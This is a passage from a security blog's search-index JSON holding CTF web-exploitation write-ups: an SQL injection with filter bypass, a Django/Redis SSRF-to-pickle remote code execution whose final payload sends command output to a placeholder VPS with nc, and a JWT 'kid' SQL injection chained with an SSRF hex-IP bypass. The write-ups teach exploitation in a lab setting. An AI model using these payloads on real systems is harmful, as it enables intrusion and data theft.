a built in slice function so the result of []+\u0026rdquo;*\u0026ldquo;+[] will be a string , we can now enter our payload with q=\u0026rsquo; in the end to ensure that our array will be a string when it reaches the substring part For example :\n q='or 1=1 \u0026ndash; -\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=\u0026rsquo;\n will let us pass !\nFILTERS BYPASSED SUCCESSFULLY\nTo test the number of q parameters and debug the app , i changed a little bit the source code and hosted the web app locally , you can find the modified source code  HERE if you want to test :D\nThe next part is pretty classic , a simple sql injection , we will first dump the columns name (we know the table name from the source code)\n q=%27union%20SELECT%20column_name%20FROM%20information_schema.columns%20\u0026ndash;%20-\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=%27\n and finally we find a column named crime so our final payload will be :\n HOST/?q=%27union%20SELECT%20crime%20FROM%20criminals%20\u0026ndash;%20-\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=a\u0026amp;q=%27\n And Congratulations ! I want to thank the organizers for this great CTF and fun tasks , i have really enjoyed participating\n","date":1584576000,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1584576000,"objectID":"69529b563e3d5c941234b067b82bbb69","permalink":"https://ahmed-belkahla.me/post/angstromctf20/","publishdate":"2020-03-19T00:00:00Z","relpermalink":"/post/angstromctf20/","section":"post","summary":"A Peculiar Query (180pts) (73 Solves) I really liked this web task , we are given this web page that have a search functionality\nAnd we can read the source code","tags":null,"title":"ångstrom CTF 2k20 - Web Exploitation","type":"post"},{"authors":null,"categories":null,"content":"Shinobis World (1000pts) (1 Solves) Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !\nOur first impression, we see an url fetcher that is curling websites which will be probably some SSRF , we try the usual payloads and we find that file ,localhost and 127.0.0.1 are filtered so we can use 127.0.1 and maybe http or gopher protocol , firstly let\u0026rsquo;s think , as we said we had a redis instance that is running on localhost , so may be using the ssrf we can interact with it\nin fact you can use gopher protocol to interact with redis :\n gopher://127.0.1:6379/_RedisCommandHERE\n for example to list all keys:\n  gopher://127.0.1:6379/_keys%20*\n  if we refresh the shinobis web page and then list all keys we can see some new keys that are set :\n :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC\n :1:views.decorators.cache.cache_header..a906279c6f1b8c76747a8ba71e866d8c.en-us.UTC\n  If you read the Django Manual you will find that the caching system in django is a little bit different , first of all django will serialize the header and the rest of the page using pickle then it will cache them in the memory\nSo the idea is to forge our payload using pickle and the set the default key of django (:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC) with our payload , here is what will happen chronologically :\n Django will try to load the page so firstly he will check if the :1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC key is set if the key is set he will unpickle the data stored there and load the page using this content Our payload will be executed then Bingo we will have the flag :D  Final Payload :\n gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20\u0026quot;cposix\\nsystem\\np0\\n(S\u0026rsquo;ls|nc YourVPSIP 1234\u0026rsquo;\\np1\\ntp2\\nRp3\\n.\u0026rdquo; This Payload will execute ls command and send it to our vps (don\u0026rsquo;t forget to refresh the Shinobis page because it\u0026rsquo;s the page that is being cached)\n Note: You can find the source code of this task in the source code repo of my github repo\nConclusion\nI hope that you liked the challenge , i tried to combine the SSRF with this default feature of django that can be used maliciously , it can be applied with any caching system (Memcached or Redis ..) If you have any questions dont forget to contact me and if you liked this writeup please star this repo :D\n","date":1579737600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1579737600,"objectID":"0115426ad15f4b3eb137669dff5b0d89","permalink":"https://ahmed-belkahla.me/post/shinobisworld/","publishdate":"2020-01-23T00:00:00Z","relpermalink":"/post/shinobisworld/","section":"post","summary":"Shinobis World (1000pts) (1 Solves) Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !","tags":null,"title":"Shinobis World - Web Exploitation NCSC 2.0 CTF","type":"post"},{"authors":null,"categories":null,"content":"JWT In a new way (1000pts) (0 Solves) And finally i\u0026rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i hope you enjoy it :D However bring your coffee cup and let\u0026rsquo;s begin the road . This Task has 3 steps , the first one is bypassing JWT token with a custom attack (not the regular ones) actually using an SQL injection in one of the token parameters , then we will have to exploit an ssrf to crypt the content of flag file (too much filters here haha)\n1st Step : JWT Bypass After visiting the link we have a simple web page with a sign in and sign up page ;\nSo after registering with random creds and signing in we check the cookies and as the task name refers we find a jwt token\nWe go as usual to the famous jwt.io to see the content of the token\nWe can try all the regular attacks but nothing will work , the kid value in the header is suspicious as we dont see it always in JWT tokens so after some googling we can conclude that the kid parameter is used when the jwt token is signed using multiple keys , each kid value refers to a different key (Example: kid:1 refers for ex to the key \u0026lsquo;blabla\u0026rsquo; and when we have kid:2 we are using a different key to sign the jwt token) Hmmm things are getting interesting here, we can suppose that the keys are fetched from a database maybe , let\u0026rsquo;s read again the description , we can notice a hint for SQL so maybe we have an SQL injection ? Let\u0026rsquo;s try to trigger an error by injecting this in the kid parameter\n ' UNION SELECT 2 \u0026ndash; -\n But Before you will have to fully understand how JWT tokens are forged, because there is no libraries that include the kid implementation so let\u0026rsquo;s take some notes here :\nAs we all know JWT token have 3 sections : Header + Payload + signature\nHeader : typically consists of two parts: the type of the token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA but here we have also the kid part which is optional\nPayload : it contains statements about an entity (typically, the user) and additional data .\nSignature : Simply if we are using HS256 the sig is : Signature= HMACSHA256(BASE64URL(HEADER)+\u0026rsquo;.\u0026lsquo;+BASE64URL(PAYLOAD))\nBe careful it\u0026rsquo;s BASE64URL not a regular BASE64 you can read about it here : LINK\nNOTE: you can use the php function hash_hmac(\u0026lsquo;sha256\u0026rsquo;, $msg, $key, true) to sign the token\nso after forging the JWT token and replacing it we got this page !\nToken i used (i have used a random key for the signature) :\n eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIiAnIFVOSU9OIFNFTEVDVCAyIC0tIC0ifQ.eyJ1c2VyIjogImFhIiwidHlwZSI6ICJhZG1pbiJ9.xXh6UOMjm0YtgmiIsL6VExdDCLiUhIEF28kjv8UzWpo\n Hmmmmmmm an interesting message i think we are on a good path , now let\u0026rsquo;s think wisely , we have two paths now , the first one is to try to leak the keys with a blind SQL injection which is really painful especially if we face some filters and the second one which we will follow.\nWe will force the jwt token to use a key we provide to sign the token ; after some regular SQL injection tests we found that we had two columns which is expected (a column for the id and a column for the key ) we use this payload in the kid parameter\n \u0026lsquo;UNION SELECT 1,\u0026lsquo;kahla\u0026rsquo; \u0026ndash; -\n Thus the key will be forced to be kahla BUT we still get the annoying page \u0026ldquo;Here is your flag ! Just kidding \u0026quot; :'( (What an evil author 3:) )\nI think there are some filters here :'( Let\u0026rsquo;s try this payload in the kid parameter :\n \u0026lsquo;UNiOn SElEcT 1,\u0026lsquo;abc\u0026rsquo; \u0026ndash; -\n The final token used:\neyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIidVTmlPbiBTRWxFY1QgMSwnYWJjJyAtLSAtIn0.eyJ1c2VyIjogIiIsInR5cGUiOiAiYWRtaW4ifQ.3cOHXg1U7Mj_I3ag37oeg5KWJYA11T74bbD4NrcMC8A\nAnd yeeeeeeees we did it ! but WTF where is our flag ! we need to finish this step before\n2nd Step : SSRF + Decrypt It\u0026rsquo;s a web application that crypts a txt file and after some tries i figured that it only accepts urls that finish with .txt extension\nWe can all notice that it\u0026rsquo;s an ssrf but:\n file protocol is filtered we only can use http or https protocol localhost,127.0.0.1,127.0.1,the octal form of ip , and even ipv6 localhost address are filtered  Finally i used this payload that bypassed all the filters below :\n http://0x7f000001/flag.txt\n I used the hexadecimal format of local ip address :D\nAnd Bingo we have our flag but it\u0026rsquo;s encrypted If you check the source code you find a hint that leads us to visit robots.txt file and BINGO we find the crypting function\npublic static function cryptage($content){ $i=0; $words=array('kAHl4','$ecUriNets','Cha1m4','th4meUr','WhiT3HacK3Rs','Ani$Bo$$CoUldNtS0Lv31t'); $crypted=\u0026quot;\u0026quot;; for($i=0;$i\u0026lt;strlen($content);$i-=-pow(0,0)) { $ser=serialize(array($words[$i % 6],'securinets')); $key=intval(explode(\u0026quot;:\u0026quot;,explode(\u0026quot;;\u0026quot;,$ser)[1])[1]); $crypted=$crypted.chr(ord($content[$i])+$key) ; } return $crypted;  But it\u0026rsquo;s somehow a little bit obfuscated , however after digging here is the decrypt function\nfunction decryptage($content){ $i=0; $words=array('kAHl4','$ecUriNets','Cha1m4','th4meUr','WhiT3HacK3Rs','Ani$Bo$$CoUldNtS0Lv31t'); $decrypted=\u0026quot;\u0026quot;; for($i=0;$i\u0026lt;strlen($content);$i-=-pow(0,0)) { $ser=serialize(array($words[$i % 6],'securinets')); $key=intval(explode(\u0026quot;:\u0026quot;,explode(\u0026quot;;\u0026quot;,$ser)[1])[1]); $decrypted=$decrypted.chr(ord($content[$i])-$key) ; } return $decrypted ; } $cont=\u0026quot;eG9pfH5/c296eu+/vW01On1mP++/vTh4ZVt0SWRLe3tU77+9d2lJO1rvv71kXTZzYklkXk44MDcm77+9EA==\u0026quot; ; $con=base64_decode($cont); $res= decryptage($con); echo $res;  Executing this will give you the flag but with some unreadable characters (because of the non printable characters after crypting it) that\u0026rsquo;s why we can use curl in our cli and extract the crypted flag and save it or simply we can use a little python script that automates this and FINALLY we got The flag :\n securinets{W00w_3v3n_Th3_AutHor_C4Nt_S0lV3_TH1$!!}\n *** Conclusion ***\nI hope you liked this task , it took me 4 continuous days of hard work to implement this idea ( i had to write a big part of jwt generator ) you can find the source code in the same directory ! Anyways dont forget to star me and if you faced any problems please contact me!\n","date":1579651200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1579651200,"objectID":"90f4ce3510f102d8442ff6396cd36b56","permalink":"https://ahmed-belkahla.me/post/jwt-in-a-new-way/","publishdate":"2020-01-22T00:00:00Z","relpermalink":"/post/jwt-in-a-new-way/","section":"post","summary":"JWT In a new way (1000pts) (0 Solves) And finally i\u0026rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i hope you enjoy it :D However bring your coffee cup and let\u0026rsquo;s begin the road .","tags":null,"title":"JWT In A New Way - NCSC 2.0 CTF","type":"post"},{"authors":["Belkahla Ahmed"],"categories":["Cybersecurity"],"content":"","date":1566333101,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1566333101,"objectID":"fb9b05aa559be701b6dc5347a5bc3159","permalink":"https://ahmed-belkahla.me/project/networking-and-security/","publishdate":"2019-08-20T22:31:41+02:00","relpermalink":"/project/networking-and-security/","section":"project","summary":"These are some network and security related tools, including a keylogger, undetectable Backdoor, DNS/ARP spoofer and a file interceptor ","tags":["Cybersecurity"],"title":"Networking and Security Tools","type":"project"}]